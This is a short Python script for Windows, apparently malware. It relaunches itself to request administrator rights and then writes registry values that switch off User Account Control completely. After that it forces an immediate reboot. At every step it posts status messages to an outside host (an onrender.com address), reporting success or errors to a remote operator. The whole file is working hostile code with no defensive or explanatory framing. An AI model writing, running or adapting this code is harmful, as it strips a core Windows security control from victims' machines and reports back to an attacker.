import ctypes
import sys
import winreg as reg
from requests import post
from os import system
def disable_uac():
    try:
        post("https://ms32-sha2.onrender.com/"+"output",json={"user":"<UAC>","err":"SUCESS   ADMIN GRANTED"})
        # Path to UAC registry key
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        uac_keys = {
            "EnableLUA": 0,  # Disables UAC
            "ConsentPromptBehaviorAdmin": 0,  # No prompt for admin
            "ConsentPromptBehaviorUser": 0,  # No prompt for standard users
        }

        # Open the registry key for modification
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
            for name, value in uac_keys.items():
                reg.SetValueEx(key, name, 0, reg.REG_DWORD, value)
                print(f"{name} set to {value}")
        
        
        post("https://ms32-sha2.onrender.com/"+"output",json={"user":"<UAC>","err":"SUCESS   MAKSAD PURA ALLAH HU AKBHARRRR"})
        system("shutdown /r /t 0")
    except Exception as e:
        
        post("https://ms32-sha2.onrender.com/"+"output",json={"user":"<UAC>","err":F"FATAL   ERROR:{e}"})
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if is_admin():
        disable_uac()
    else:
        # Relaunch the script with administrative privileges
        post("https://ms32-sha2.onrender.com/"+"output",json={"user":"<UAC>","err":F"PENDING   GETTING ADMIN RIGHTS FOR MANIPULATION...."})
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 1
        )